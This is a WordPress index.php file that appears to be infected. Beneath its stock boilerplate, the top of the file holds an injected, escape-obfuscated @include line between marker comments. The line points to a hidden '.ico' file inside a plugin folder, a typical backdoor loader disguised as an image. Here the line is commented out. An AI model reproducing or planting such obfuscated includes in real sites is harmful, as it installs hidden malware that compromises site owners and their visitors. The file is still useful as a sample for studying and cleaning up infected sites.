<?php
/*88d45*/

// @include "\057var/\167ww/h\164ml/w\160-con\164ent/\160lugi\156s/ey\145s-on\154y-us\145r-ac\143ess-\163hort\143ode/\056310d\144a05.\151co";

/*88d45*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
